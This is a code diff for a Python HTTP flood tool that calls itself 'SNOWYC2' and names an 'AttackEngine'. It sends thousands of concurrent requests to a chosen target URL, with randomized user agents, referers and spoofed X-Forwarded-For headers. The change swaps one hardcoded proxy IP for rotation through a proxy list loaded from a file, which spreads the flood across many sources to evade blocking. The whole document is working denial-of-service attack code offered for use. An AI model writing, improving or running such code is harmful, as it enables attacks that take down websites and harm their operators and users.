@@ -7,7 +7,6 @@ import time
 # Config
 MAX_CONCURRENT = 4000
 REQUEST_TIMEOUT = 10
-PROXY = "http://84.39.112.144:3128"
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -23,12 +22,22 @@ REFERERS = [
 
 VALID_METHODS = ["C-ECLIPSE"]
 
+# Load proxies from file
+def load_proxies():
+    try:
+        with open("proxy.txt", "r") as f:
+            return [line.strip() for line in f if line.strip()]
+    except:
+        print("proxy.txt not found or empty.")
+        return []
+
 class AttackEngine:
-    def __init__(self, method, target, duration):
+    def __init__(self, method, target, duration, proxies):
         self.method = method
         self.target = target
         self.time = duration
         self.start_time = 0
+        self.proxies = proxies
         self.stats = {
             'total': 0,
             'success': 0,
@@ -38,43 +47,50 @@ class AttackEngine:
         }
         self.semaphore = asyncio.Semaphore(1000)
 
-    async def make_request(self, session):
+    async def make_request(self, proxy):
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
             "Referer": random.choice(REFERERS),
             "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
         }
-        async with self.semaphore:
-            try:
-                async with session.get(self.target, headers=headers, proxy=PROXY, timeout=REQUEST_TIMEOUT) as response:
+
+        conn = aiohttp.TCPConnector(ssl=False)
+        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+
+        try:
+            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
+                proxy_url = f"http://{proxy}"
+                async with session.get(self.target, headers=headers, proxy=proxy_url) as response:
                     if response.status == 200:
                         return "SUCCESS"
                     elif str(response.status).startswith("4"):
                         return "ERROR"
                     return "OTHER"
-            except:
-                return "ERROR"
+        except:
+            return "ERROR"
 
     async def run_attack(self):
         self.start_time = time.time()
         end_time = self.start_time + self.time
 
-        connector = aiohttp.TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            while time.time() < end_time:
-                tasks = [asyncio.create_task(self.make_request(session)) for _ in range(MAX_CONCURRENT)]
-                results = await asyncio.gather(*tasks)
+        while time.time() < end_time:
+            tasks = []
+            for _ in range(MAX_CONCURRENT):
+                proxy = random.choice(self.proxies)
+                tasks.append(asyncio.create_task(self.make_request(proxy)))
 
-                self.stats['total'] += len(results)
-                self.stats['success'] += results.count("SUCCESS")
-                self.stats['errors'] += results.count("ERROR")
+            results = await asyncio.gather(*tasks)
 
-                elapsed = time.time() - self.start_time
-                current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
-                self.stats['rps'] = current_rps
-                self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
+            self.stats['total'] += len(results)
+            self.stats['success'] += results.count("SUCCESS")
+            self.stats['errors'] += results.count("ERROR")
 
-                self.print_status()
+            elapsed = time.time() - self.start_time
+            current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
+            self.stats['rps'] = current_rps
+            self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
+
+            self.print_status()
 
     def print_status(self):
         elapsed = time.time() - self.start_time
@@ -83,7 +99,6 @@ class AttackEngine:
         print(f"\nSNOWYC2 - T.ME/STSVKINGDOM | METHOD: {self.method}")
         print("=" * 60)
         print(f" TARGET: {self.target}")
-        print(f" PROXY: {PROXY}")
         print(f" TIME LEFT: {remaining:.1f}s")
         print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
         print(f" RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
@@ -117,7 +132,12 @@ def main():
     if not target.startswith(('http://', 'https://')):
         target = f"http://{target}"
 
-    engine = AttackEngine(method, target, duration)
+    proxies = load_proxies()
+    if not proxies:
+        print("No proxies loaded.")
+        return
+
+    engine = AttackEngine(method, target, duration, proxies)
 
     try:
         asyncio.run(engine.run_attack())
